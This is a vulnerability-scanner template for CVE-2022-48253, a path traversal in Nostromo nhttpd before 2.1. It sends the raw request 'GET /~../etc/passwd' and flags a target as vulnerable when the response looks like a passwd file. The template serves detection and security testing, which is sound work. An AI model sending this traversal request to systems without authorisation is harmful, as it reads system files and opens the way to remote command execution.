id: CVE-2022-48253

info:
  name: Nostromo nhttpd path traversal
  author: zan8in
  severity: critical
  verified: true
  description: |
    nhttpd in Nostromo before 2.1 is vulnerable to a path traversal that may allow an attacker to execute arbitrary commands on the remote server. The vulnerability occurs when the homedirs option is used.

set:
  hostname: request.url.host
rules:
  r0:
    request:
      raw: |
        GET /~../etc/passwd HTTP/1.1
        Host: {{hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
    expression: '"root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)'
expression: r0()